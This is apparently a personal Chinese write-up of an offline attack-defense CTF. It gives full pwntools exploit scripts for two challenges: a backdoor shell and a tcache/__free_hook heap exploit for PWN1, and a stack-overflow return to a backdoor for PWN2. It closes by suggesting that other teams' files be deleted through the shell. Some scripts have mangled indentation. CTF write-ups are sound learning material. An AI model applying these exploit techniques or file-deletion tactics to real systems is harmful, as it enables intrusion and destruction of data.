# 安洵杯线下赛--WP


# 安询杯线下赛——WP

###### Oh baby,don't you know we've all got hidden treasures.Do you remember  time?	——《Buried Treasure》Grant-Lee phillips

<!--more-->

## 前言

这应该算是我第一次正式的参加线下赛，赛场上的零食很好吃，盒饭还行，但是比不过师傅们的英姿。被打的很惨惨，原本一个组是有4个队员的，但是由于我们队有两个队员有别的事情，最后就只有两个人参加线下赛。在比赛时，我的虚拟机网络还出现了一些问题，没办法跑自动化脚本，就只能叫另一个师傅跑了，导致另一个师傅没有精力去看和修web题。不过这次比赛算是把PWN题AK了，并且pwn2打了全场最高峰。（题目已上传[github]()）

## 题解

### PWN1

题目是一个语言解释器，当输入excv(";sh")时将会获得shell。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	sh=remote()
else:
	sh=process("./pwn")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	context.terminal = ['tmux', 'splitw', '-h']
	gdb.attach(sh,command)

def run_code(code):
    lenth=len(code)
    ru("$")
    sl("1")
    ru(":")
    sl(str(lenth))
    ru(":")
    s(code)

def exp():
        #debug("b*0x0000555555556A68\nc")
        run_code("ev(\";sh\")")
        time.sleep(0.1)
        sl("cat flag")
	itr()

exp()

````

赛后才知道，原来这仅仅只是一个后门，程序还存在另外一个漏洞，在使用数组时存在数组越界。但由于逆向困难比较大，暂时还没有做出来，就先把WP贴出来，之后再细看。

````python
#!/usr/bin/env python3 
#-*- coding:utf-8 -*- 
from pwn import * 
import os 
r = lambda x : io.recv(x) 
ra = lambda : io.recvall() 
rl = lambda : io.recvline(keepends = True) 
ru = lambda x : io.recvuntil(x, drop = True) 
s = lambda x : io.send(x) 
sl = lambda x : io.sendline(x) 
sa = lambda x, y : io.sendafter(x, y) 
sla = lambda x, y : io.sendlineafter(x, y) 
ia = lambda : io.interactive() 
c = lambda : io.close() 
li = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m') 
context.log_level='debug' 
context.terminal = ['tmux', 'splitw', '-h'] 
elf_path = 'runner' 
libc_path = './libc.so.6' 
#libc_path = '/lib/x86_64-linux-gnu/libc.so.6' 
# remote server ip and port server_ip = "127.0.0.1" server_port = 20100
# if local debug LOCAL = 0 LIBC = 1 
#--------------------------func----------------------------- 
def db(): 
    if(LOCAL): 
        gdb.attach(io) 
def input_code(sz, d):
    sla('$', '1') 
    sla(':', str(sz)) 
    sa(':', d) 
#--------------------------exploit-------------------------- 
def exploit():
    li('exploit...') 
    p = 's0 = "' + 'A' * 0x40 + '";' # make number of tcache bin > 1 
    p += 's1 = "' + 'A' * 0x450 + '";'
	p += 's2 = "' + 'A' * 0x40 + '";' # avoid merge to top chunk and for tcache attack
    p += 's1 = "' + 'A' * 0x10 + '";' # free s1
    p += 'ps("AAAAAAAA");' # leak libc addr 
    p += 'paddin_to_key = "' + 'A' * 0x20 + '";'; # paddin arr1[18] to tcache bin key 
    p += 'ay arr1[1];' # for clean tcache bin key 
    p += 'paddin_to_fd = "' + 'A' * 0x20 + '";'; # ajust arr2[15] to tcache bin fd
    p += 'paddin_to_fd_2 = "' + 'A' * 0x10 + '";'; # ajust arr2[15] to tcache bin fd
    p += 'ay arr2[1];' # for modify tcache bin fd 
    p += 's0 = "free";' # free as a tcache bin
    p += 's2 = "free";' # free as a tcache bin 
    p += 'n = 0; in(n);' # input free_hook addr 
    p += 'arr1[18] = 256;' # clean tcache bin key 
    p += 'arr2[15] = n;'
    p += 'ay align[1];' # malloc first tcache bin 
    p += 'ay target[1];' # malloc to __free_hook
    p += 'in(n);' # input system addr
    p += 'target[0] = n;'
    p += 'sh = "/bin/sh";' 
    #p += 'in(n);' # pause 
    p += 'sh = "free";' 
    input_code(len(p), p) 
    leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00') 
    libc_base = leak - libc.sym['__malloc_hook'] - 0x10 - 1120 
    free_hook = libc_base + libc.sym['__free_hook'] 
    system = libc_base + libc.sym['system'] 
    li('leak: ' + hex(leak)) 
    li('libc_base: ' + hex(libc_base)) 
    p = str(free_hook - 0x28)
    p = p.ljust(0x20, '\x00') 
    s(p)
    p = str(system) 
    p = p.ljust(0x20, '\x00') 
    s(p) 
def finish(): 
    ia() 
    c() 
    #--------------------------main-----------------------------
if __name__ == '__main__': 
    if LOCAL: 
        elf = ELF(elf_path) 
    	if LIBC:
        	libc = ELF(libc_path) 
       	 	io = elf.process(env = {"LD_PRELOAD" : libc_path} ) 
    	else:
        	libc = elf.libc
        	io = elf.process() 
    else:elf = ELF(elf_path) 
            io = remote(server_ip, server_port)
          if LIBC:
            libc = ELF(libc_path) 
    exploit() 
    finish()
````

### PWN2

题目在第二次输入时存在栈溢出，刚好可以覆盖返回地址。留了一个后门函数，可以读出flag。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	sh=remote("192.168.206.100",50880)
else:
	sh=process("./pwn")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	context.terminal = ['tmux', 'splitw', '-h']
	gdb.attach(sh,command)

def stack_attack(message):
    ru(":")
    sl("1")
    ru("3")
    sl("3")
    sl(message)

def exp():
        #debug("b*0x000000000040110A\nc")
        stack_attack("a"*0x48+p64(0x000000000400F36))
	itr()

exp()
````

题目很简单，但是在比赛的时候，没有去想怎么patch，那个时候只想着用lief去patch，而没有想着绕过执行条件。比如这道题，可以直接把jnz改成jmp即可。

![image-20201213193215436](https://i.loli.net/2020/12/17/P2UnBY81DIxazg7.png)

## 总结

线下赛的题目相对线上赛来说漏洞没有那么难利用，但是逆向的难度比线上难不少，发现难度比较高。所以线下赛发现漏洞得从攻击面来分析，不能像线上赛的题目一样，直接逆向整个程序。对于CTF来说，攻击面就是输入的数据，是否会溢出，使用的堆是否存在UAF等。这次赛前没有把自动化攻击脚本准备好，导致在比赛时，花了太多的时间在测试自动化脚本上，下次线下赛的时候，一定得把这些东西给提前准备好。还有一个有趣的姿势，由于PWN1可以直接获得shell，那么可以将别人的文件给删除，这样别的队伍每轮check时就会扣分。
